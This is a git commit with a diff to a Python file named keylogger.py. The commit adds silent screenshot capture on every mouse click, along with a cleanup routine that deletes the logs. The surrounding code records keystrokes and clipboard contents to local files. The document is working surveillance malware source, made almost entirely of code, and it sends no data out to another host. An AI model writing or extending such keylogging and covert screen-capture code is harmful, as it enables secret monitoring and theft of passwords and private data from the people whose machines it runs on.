6ed1d738f18a620a6d72823b0b63bffe299a6164
Enerinn <shizuto23231@icloud.com>
2024-05-13 18:12:49 -0400

    Added cleanup code

--- keylogger.py
+++ keylogger.py
@@ -3,7 +3,7 @@ from pynput import keyboard, mouse
 from richxerox import *
 import os
 import subprocess
-import sys
+import shutil
 
 log_file = open("log.txt", "w")
 clipboard_file = open("clipboard.txt", "w")
@@ -29,28 +29,44 @@ def on_release(key):
     if key == keyboard.Key.esc:
         return False
     
-def on_click(x, y, button, pressed):
+def take_screenshot():
+    global count
+    filename = f'sc{str(count)}.png'
+    outfile = os.path.join(folder, filename)
+    count += 1
+    outcmd = "{} {} {}".format('screencapture', '-x', outfile)
     try:
         subprocess.check_output([outcmd], shell=True)
     except subprocess.CalledProcessError as e:
         print('Error: [%d]\n{}\n'.format(e.returncode, e.output))
+
+def on_click(x, y, button, pressed):
+    if pressed:
+        take_screenshot()
+        
+def cleanup():
+    listener2.stop()
+    log_file.close()
+    clipboard_file.close()
+    shutil.rmtree(folder)
+    os.remove("log.txt")
+    os.remove("clipboard.txt")
+        
 folder = os.path.join(os.getcwd(), 'screenshot_folder')
 if os.path.isdir(folder) == False:
     os.mkdir(folder)
-outfile = os.path.join(folder, 'screenshot.png')
-outcmd = "{} {} {}".format('screencapture', '-x', outfile)
     
 listener = keyboard.Listener(on_press=on_press, on_release=on_release)
 listener2 = mouse.Listener(on_click=on_click)
-listener2.start()
 listener.start()
+listener2.start()
         
 text = None
+count = 0
 while (listener.is_alive()):
     sleep(1)
     if (text == paste(format='text')):
         continue
     text = paste(format='text')
     clipboard_file.write(text+"\n")
-log_file.close()
-clipboard_file.close()
+cleanup()
